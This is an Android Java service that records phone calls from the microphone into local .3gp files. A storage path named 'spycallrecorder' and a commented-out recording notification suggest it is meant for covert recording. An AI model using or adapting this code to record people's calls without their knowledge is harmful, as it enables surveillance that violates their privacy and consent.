package com.enuke.smartapp.call.service;

import java.io.File;
import java.io.IOException;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.MediaRecorder;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.util.Log;
import android.widget.Toast;

import com.blinkawards.utility.Utility;

public class CallRecordSaveDataService  extends Service
implements MediaRecorder.OnInfoListener, MediaRecorder.OnErrorListener
{
private static final String TAG = "CallRecorder";

public static final String DEFAULT_STORAGE_LOCATION = "/sdcard/spycallrecorder";
private static final int RECORDING_NOTIFICATION_ID = 1;

private MediaRecorder recorder = null;
private boolean isRecording = false;
private File recording = null;;


@SuppressLint("SimpleDateFormat")
private File makeOutputFile (SharedPreferences prefs) throws Exception
{
File audioRoot = CallRecordSaveDataService.this.getDir("Image", Context.MODE_PRIVATE);
	
    File dir = new File(DEFAULT_STORAGE_LOCATION);

    // test dir for existence and writeability
  /*  if (!dir.exists()) {
        try {
            dir.mkdirs();
        } catch (Exception e) {
            Log.e("CallRecorder", "RecordService::makeOutputFile unable to create directory " + dir + ": " + e);
            Toast t = Toast.makeText(getApplicationContext(), "CallRecorder was unable to create the directory " + dir + " to store recordings: " + e, Toast.LENGTH_LONG);
            t.show();
            return null;
        }
    } else {
        if (!dir.canWrite()) {
            Log.e(TAG, "RecordService::makeOutputFile does not have write permission for directory: " + dir);
            Toast t = Toast.makeText(getApplicationContext(), "CallRecorder does not have write permission for the directory directory " + dir + " to store recordings", Toast.LENGTH_LONG);
            t.show();
            return null;
        }
    }*/

   
    // create filename based on call data
    String prefix = "CallRecord";
   /* SimpleDateFormat sdf = new SimpleDateFormat("yyyy-mm-dd_HH:MM:SS");
    prefix = sdf.format(new Date()) + "-callrecording";
*/
    // create suffix based on format
    String suffix = ".3gp";
  
    try {
        return File.createTempFile(prefix, suffix,Utility.getDataDir(CallRecordSaveDataService.this));
    } catch (IOException e) {
        Log.e("CallRecorder", "RecordService::makeOutputFile unable to create temp file in " + dir + ": " + e);
        Toast t = Toast.makeText(getApplicationContext(), "CallRecorder was unable to create temp file in " + dir + ": " + e, Toast.LENGTH_LONG);
        t.show();
        return null;
    }
}

public void onCreate()
{
    super.onCreate();
    recorder = new MediaRecorder();
    Log.i("CallRecorder", "onCreate created MediaRecorder object");
}

public void onStart(Intent intent, int startId) {
    //Log.i("CallRecorder", "RecordService::onStart calling through to onStartCommand");
    //onStartCommand(intent, 0, startId);
    //}

    Log.i("CallRecorder", "RecordService::onStartCommand called while isRecording:" + isRecording);

    if (isRecording) return;

    Context c = getApplicationContext();
    SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(c);

    Boolean shouldRecord = true;
    if (!shouldRecord) {
        Log.i("CallRecord", "RecordService::onStartCommand with PREF_RECORD_CALLS false, not recording");
        //return START_STICKY;
        return;
    }

    int audiosource = MediaRecorder.AudioSource.MIC;
    int audioformat =MediaRecorder.OutputFormat.THREE_GPP;

    try {
		recording = makeOutputFile(prefs);
	} catch (Exception e1) {
		// TODO Auto-generated catch block
		e1.printStackTrace();
	}
    if (recording == null) {
        recorder = null;
        return; //return 0;
    }

    Log.i("CallRecorder", "RecordService will config MediaRecorder with audiosource: " + audiosource + " audioformat: " + audioformat);
    try {
        // These calls will throw exceptions unless you set the 
        // android.permission.RECORD_AUDIO permission for your app
        recorder.reset();
        recorder.setAudioSource(audiosource);
        Log.d("CallRecorder", "set audiosource " + audiosource);
        recorder.setOutputFormat(audioformat);
        Log.d("CallRecorder", "set output " + audioformat);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
        Log.d("CallRecorder", "set encoder default");
        recorder.setOutputFile(recording.getAbsolutePath());
        Log.d("CallRecorder", "set file: " + recording);
        //recorder.setMaxDuration(msDuration); //1000); // 1 seconds
        //recorder.setMaxFileSize(bytesMax); //1024*1024); // 1KB

        recorder.setOnInfoListener(this);
        recorder.setOnErrorListener(this);
        
        try {
            recorder.prepare();
        } catch (java.io.IOException e) {
            Log.e("CallRecorder", "RecordService::onStart() IOException attempting recorder.prepare()\n");
            Toast t = Toast.makeText(getApplicationContext(), "CallRecorder was unable to start recording: " + e, Toast.LENGTH_LONG);
            t.show();
            recorder = null;
            return; //return 0; //START_STICKY;
        }
        Log.d("CallRecorder", "recorder.prepare() returned");
        
        recorder.start();
        isRecording = true;
        Log.i("CallRecorder", "recorder.start() returned");
        //updateNotification(true);
    } catch (java.lang.Exception e) {
        Toast t = Toast.makeText(getApplicationContext(), "CallRecorder was unable to start recording: " + e, Toast.LENGTH_LONG);
        t.show();

        Log.e("CallRecorder", "RecordService::onStart caught unexpected exception", e);
        recorder = null;
    }

    return; //return 0; //return START_STICKY;
}

public void onDestroy()
{
    super.onDestroy();

    if (null != recorder) {
        Log.i("CallRecorder", "RecordService::onDestroy calling recorder.release()");
        isRecording = false;
        recorder.stop();
        recorder.release();
        recorder = null;
        Toast t = Toast.makeText(getApplicationContext(), "CallRecorder finished recording call to " + recording, Toast.LENGTH_LONG);
        t.show();

        /*
        // encrypt the recording
        String keyfile = "/sdcard/keyring";
        try {
            //PGPPublicKey k = readPublicKey(new FileInputStream(keyfile));
            test();
        } catch (java.security.NoSuchAlgorithmException e) {
            Log.e("CallRecorder", "RecordService::onDestroy crypto test failed: ", e);
        }
        //encrypt(recording);
        */
    }

   // updateNotification(false);
}


// methods to handle binding the service

public IBinder onBind(Intent intent)
{
    return null;
}

public boolean onUnbind(Intent intent)
{
    return false;
}

public void onRebind(Intent intent)
{
}
// MediaRecorder.OnInfoListener
public void onInfo(MediaRecorder mr, int what, int extra)
{
    Log.i("CallRecorder", "RecordService got MediaRecorder onInfo callback with what: " + what + " extra: " + extra);
    isRecording = false;
}

// MediaRecorder.OnErrorListener
public void onError(MediaRecorder mr, int what, int extra) 
{
    Log.e("CallRecorder", "RecordService got MediaRecorder onError callback with what: " + what + " extra: " + extra);
    isRecording = false;
    mr.release();
}
}
